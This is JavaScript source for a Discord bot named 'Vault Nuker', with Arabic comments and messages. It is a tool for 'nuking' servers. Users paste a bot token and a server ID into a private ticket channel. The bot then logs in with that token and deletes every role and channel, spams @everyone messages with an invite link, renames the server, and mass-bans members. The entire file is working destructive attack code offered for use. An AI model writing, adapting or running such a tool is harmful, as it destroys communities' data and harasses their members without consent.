const { Client, GatewayIntentBits, PermissionFlagsBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder, Events, ChannelType } = require('discord.js');
const http = require('http');

const TOKEN = process.env.TOKEN; // تأكد إنك حاطط التوكن هنا أو بالـ Environment

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});

client.once('ready', () => {
    console.log(`[+] Vault Nuker is online: ${client.user.tag}`);
});

const ticketsData = new Map();

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    const content = message.content.toLowerCase().trim();
    
    // 1. فتح التكت
    if (content === 'جحفلة' || content === 'nuke') {
        await message.reply("⏳ جاري فتح تكت الجحفلة...").catch(()=>{});

        const user = message.author;
        const guild = message.guild;

        try {
            const ticketChannel = await guild.channels.create({
                name: `nuke-${user.username}`,
                type: ChannelType.GuildText,
                permissionOverwrites: [
                    { id: guild.id, deny: [PermissionFlagsBits.ViewChannel] },
                    { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
                ],
            });

            const embed = new EmbedBuilder()
                .setAuthor({ name: `@${user.username} Welcome`, iconURL: user.displayAvatarURL() })
                .setDescription("أهلاً بك في تكت **الجحفلة**.\n\n1. ضع **توكن البوت** (رسالة لحالها)\n2. ضع **ايدي السيرفر** (رسالة لحالها)\n\nبعدها اختر نوع التخريب:")
                .setColor(0xFF0000)
                .setFooter({ text: 'Vault Blackhat' });

            const actionRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId('action_delete_channels').setLabel('حذف الرومات').setStyle(ButtonStyle.Danger).setEmoji('🗑️'),
                new ButtonBuilder().setCustomId('action_ban_all').setLabel('طرد الكل').setStyle(ButtonStyle.Danger).setEmoji('🔨'),
                new ButtonBuilder().setCustomId('close_ticket').setLabel('إغلاق').setEmoji('🔒').setStyle(ButtonStyle.Secondary)
            );

            await ticketChannel.send({ content: `${user}`, embeds: [embed], components: [actionRow] });

            ticketsData.set(ticketChannel.id, { userId: user.id, token: null, guildId: null });

        } catch (error) {
            console.error(error);
            message.reply('❌ حدث خطأ (تأكد من صلاحيات البوت).');
        }
        return;
    }

    // 2. قراءة التوكن والايدي
    if (ticketsData.has(message.channel.id)) {
        const data = ticketsData.get(message.channel.id);
        
        if (message.content.length > 50 && message.content.includes('.')) {
            data.token = message.content.trim();
            await message.reply("✅ تم استلام التوكن. (يرجى وضع الايدي الان)");
        } 
        else if (/^\d{17,20}$/.test(message.content.trim())) {
            data.guildId = message.content.trim();
            await message.reply("✅ تم استلام ايدي السيرفر. (اضغط على الزر الان)");
        }
        ticketsData.set(message.channel.id, data);
    }
});

client.on(Events.InteractionCreate, async (interaction) => {
    if (!interaction.isButton()) return;
    
    const data = ticketsData.get(interaction.channel.id);

    if (interaction.customId === 'close_ticket') {
        await interaction.reply({ content: '🔒 سيتم إغلاق التذكرة بعد 5 ثواني...' });
        setTimeout(() => interaction.channel.delete().catch(()=>{}), 5000);
        return;
    }

    if (!data || !data.token || !data.guildId) {
        return interaction.reply({ content: '❌ يرجى إرسال توكن البوت وايدي السيرفر أولاً في الشات!', ephemeral: true });
    }

    await interaction.reply({ content: '⏳ جاري الاتصال بالبوت...', ephemeral: true });

    const nukeClient = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers] });

    try {
        await nukeClient.login(data.token);
        const targetGuild = await nukeClient.guilds.fetch(data.guildId).catch(() => null);

        if (!targetGuild) {
            return interaction.editReply({ content: '❌ البوت مش موجود بالسيرفر المحدد أو الايدي غلط.' });
        }

        if (interaction.customId === 'action_delete_channels') {
            await interaction.editReply({ content: '🗑️ جاري الجحفلة...' });
            
            // حذف الرتب
            for (const role of targetGuild.roles.cache.values()) {
                if (role.name !== '@everyone' && !role.managed && role.id !== targetGuild.members.me.roles.highest.id) {
                    await role.delete().catch(()=>{});
                }
            }

            // حذف القنوات
            for (const channel of targetGuild.channels.cache.values()) {
                await channel.delete().catch(()=>{});
            }

            // سبام
            for (let i = 0; i < 10; i++) {
                const newChannel = await targetGuild.channels.create({ name: 'nuked-by-hero-ninja', type: ChannelType.GuildText }).catch(()=>null);
                if (newChannel) {
                    for (let j = 0; j < 5; j++) {
                        await newChannel.send("@everyone **تم الجحفلة بواسطة HeRo - Ninja** 💀\n\nhttps://discord.gg/197").catch(()=>{});
                    }
                }
            }

            await targetGuild.setName('جحفلة HeRo - Ninja').catch(()=>{});
            await interaction.editReply({ content: '✅ تم الجحفلة بنجاح.' });
        }

        if (interaction.customId === 'action_ban_all') {
            await interaction.editReply({ content: '🔨 جاري باند الأعضاء...' });
            const members = await targetGuild.members.fetch();
            for (const member of members.values()) {
                if (member.id !== nukeClient.user.id && member.bannable) {
                    await member.ban({ reason: 'Nuke by HeRo - Ninja' }).catch(()=>{});
                }
            }
            await interaction.editReply({ content: '✅ تم باند الأعضاء.' });
        }

        await nukeClient.destroy();

    } catch (err) {
        console.error(err);
        await interaction.editReply({ content: '❌ التوكن غلط، أو البوت ما عنده Administrator بالسيرفر.' });
    }
});

http.createServer((req, res) => res.end('Bot is alive!')).listen(process.env.PORT || 3000);

client.login(TOKEN);
